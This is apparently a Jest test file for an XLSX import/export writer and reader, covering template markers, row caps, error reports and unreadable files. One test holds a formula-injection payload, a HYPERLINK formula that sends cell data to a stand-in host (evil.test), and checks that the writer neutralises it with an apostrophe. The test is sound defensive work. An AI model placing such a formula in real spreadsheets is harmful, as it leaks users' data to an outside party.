import { PassThrough, Readable, Writable } from 'node:stream';

import type { ImportDefinition } from '../domain/definitions';
import type { ExportWriteInput } from '../domain/import-export.ports';
import { XlsxWorkbookReader } from './xlsx.reader';
import { XlsxWorkbookWriter } from './xlsx.writer';

const writer = new XlsxWorkbookWriter();
const reader = new XlsxWorkbookReader();

const text = (value: string) => ({ id: value, en: value });

const DEFINITION: ImportDefinition = {
  key: 'holiday.calendar',
  requiredPermission: 'holiday.calendar.import',
  templateVersion: 3,
  columns: [
    { key: 'date', header: text('Tanggal'), type: 'date', required: true, example: '2026-01-01' },
    { key: 'name', header: text('Nama'), type: 'string', required: true, example: 'Tahun Baru' },
    {
      key: 'kind',
      header: text('Jenis'),
      type: 'enum',
      required: true,
      enumValues: ['national', 'cuti_bersama'],
      example: 'national',
    },
  ],
  naturalKey: ['date', 'kind'],
  writeMode: 'upsert',
  commitMode: 'partial',
  rowHandler: { apply: () => Promise.resolve({ ok: true as const, value: undefined }) },
};

/** Collects a stream into one buffer — the sink both writers take. */
function collector(): { sink: Writable; bytes: () => Promise<Buffer> } {
  const chunks: Buffer[] = [];
  const sink = new PassThrough();
  sink.on('data', (chunk: Buffer) => chunks.push(chunk));
  const done = new Promise<void>((resolve) => sink.on('end', () => resolve()));
  return {
    sink,
    bytes: async () => {
      await done;
      return Buffer.concat(chunks);
    },
  };
}

describe('the xlsx round trip — the writer and the reader are one contract', () => {
  it('reads back a template’s marker, headers and example row', async () => {
    const { sink, bytes } = collector();
    await writer.template(DEFINITION, 'id', sink);

    const parsed = await reader.read(Readable.from([await bytes()]), 100);

    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    // BR-IMP-006's marker survives a full write/read cycle, which is the whole
    // reason a generated template does not raise `IMP_TEMPLATE_STALE` on upload.
    expect(parsed.value.templateVersion).toBe(3);
    expect(parsed.value.headers).toEqual(['Tanggal', 'Nama', 'Jenis']);
    expect(parsed.value.rows).toHaveLength(1);
    expect(parsed.value.rows[0]?.cells.slice(0, 3)).toEqual([
      '2026-01-01',
      'Tahun Baru',
      'national',
    ]);
  });

  it('reports a workbook with no marker as version null — a file built by hand', async () => {
    const { sink, bytes } = collector();
    // An export output is a plain data sheet with no `_meta`, which is the
    // nearest thing to "somebody pasted their rows into a new workbook".
    await writer.exportRows(
      {
        definition: { key: 'x' } as unknown as ExportWriteInput['definition'],
        locale: 'id',
        columns: [{ key: 'a', header: text('A') }],
        params: {},
        // eslint-disable-next-line @typescript-eslint/require-await
        stream: (async function* () {
          yield { a: '1' };
        })(),
      },
      sink,
    );

    const parsed = await reader.read(Readable.from([await bytes()]), 100);
    expect(parsed.ok).toBe(true);
    if (parsed.ok) expect(parsed.value.templateVersion).toBeNull();
  });

  it('BR-IMP-007: aborts past the row cap rather than parsing the rest', async () => {
    const { sink, bytes } = collector();
    await writer.exportRows(
      {
        definition: { key: 'x' } as unknown as ExportWriteInput['definition'],
        locale: 'id',
        columns: [{ key: 'a', header: text('A') }],
        params: {},
        // eslint-disable-next-line @typescript-eslint/require-await
        stream: (async function* () {
          for (let index = 0; index < 20; index += 1) yield { a: String(index) };
        })(),
      },
      sink,
    );

    const parsed = await reader.read(Readable.from([await bytes()]), 5);
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) {
      expect(parsed.error.code).toBe('IMP_ROW_CAP_EXCEEDED');
      expect(parsed.error.details).toEqual({ maxRows: 5 });
    }
  });

  it('accepts a file sitting exactly on the cap', async () => {
    const { sink, bytes } = collector();
    await writer.exportRows(
      {
        definition: { key: 'x' } as unknown as ExportWriteInput['definition'],
        locale: 'id',
        columns: [{ key: 'a', header: text('A') }],
        params: {},
        // eslint-disable-next-line @typescript-eslint/require-await
        stream: (async function* () {
          for (let index = 0; index < 5; index += 1) yield { a: String(index) };
        })(),
      },
      sink,
    );

    const parsed = await reader.read(Readable.from([await bytes()]), 5);
    expect(parsed.ok).toBe(true);
    if (parsed.ok) expect(parsed.value.rows).toHaveLength(5);
  });

  it('IMP_FILE_UNREADABLE on bytes that are not a workbook at all', async () => {
    const parsed = await reader.read(Readable.from([Buffer.from('not a zip')]), 100);
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.error.code).toBe('IMP_FILE_UNREADABLE');
  });

  it('§14: writes an injected cell apostrophe-prefixed, asserted on the bytes', async () => {
    const { sink, bytes } = collector();
    await writer.exportRows(
      {
        definition: { key: 'x' } as unknown as ExportWriteInput['definition'],
        locale: 'id',
        columns: [{ key: 'note', header: text('Catatan') }],
        params: {},
        // eslint-disable-next-line @typescript-eslint/require-await
        stream: (async function* () {
          yield { note: '=HYPERLINK("https://evil.test?d="&A2,"click")' };
        })(),
      },
      sink,
    );

    const parsed = await reader.read(Readable.from([await bytes()]), 100);
    expect(parsed.ok).toBe(true);
    if (parsed.ok) {
      // Read back as text, never as a formula — the apostrophe is the storage
      // form and Excel shows the value without it.
      expect(parsed.value.rows[0]?.cells[0]).toBe(
        '\'=HYPERLINK("https://evil.test?d="&A2,"click")',
      );
    }
  });

  it('writes an error report of errored rows only, keeping their original numbers', async () => {
    const { sink, bytes } = collector();
    await writer.errorReport(
      {
        definition: DEFINITION,
        locale: 'id',
        headers: ['Tanggal', 'Nama', 'Jenis'],
        rows: [
          { rowNumber: 2, cells: ['2026-01-01', 'Tahun Baru', 'national'] },
          { rowNumber: 3, cells: ['bukan tanggal', 'Nyepi', 'custom'] },
        ],
        verdicts: [
          {
            rowNumber: 3,
            errors: [
              { column: 'date', code: 'VAL_INVALID_FORMAT', params: { expected: 'YYYY-MM-DD' } },
              { column: 'kind', code: 'VAL_INVALID_ENUM', params: { allowed: ['national'] } },
            ],
          },
        ],
      },
      sink,
    );

    const parsed = await reader.read(Readable.from([await bytes()]), 100);
    expect(parsed.ok).toBe(true);
    if (!parsed.ok) return;
    expect(parsed.value.headers).toEqual([
      'Baris',
      'Tanggal',
      'Nama',
      'Jenis',
      'Kode',
      'Keterangan',
    ]);
    expect(parsed.value.rows).toHaveLength(1);
    expect(parsed.value.rows[0]?.cells).toEqual([
      3,
      'bukan tanggal',
      'Nyepi',
      'custom',
      'VAL_INVALID_FORMAT, VAL_INVALID_ENUM',
      'Tanggal: Format tidak sesuai (YYYY-MM-DD); Jenis: Nilai tidak dikenal (national)',
    ]);
  });

  it('writes the enum sheet without it ever reaching the data pass', async () => {
    const { sink, bytes } = collector();
    await writer.template(DEFINITION, 'en', sink);

    const parsed = await reader.read(Readable.from([await bytes()]), 100);
    expect(parsed.ok).toBe(true);
    // One example row and nothing from `_enums` or `_meta` — the reader takes
    // the first sheet that is neither.
    if (parsed.ok) expect(parsed.value.rows).toHaveLength(1);
  });
});
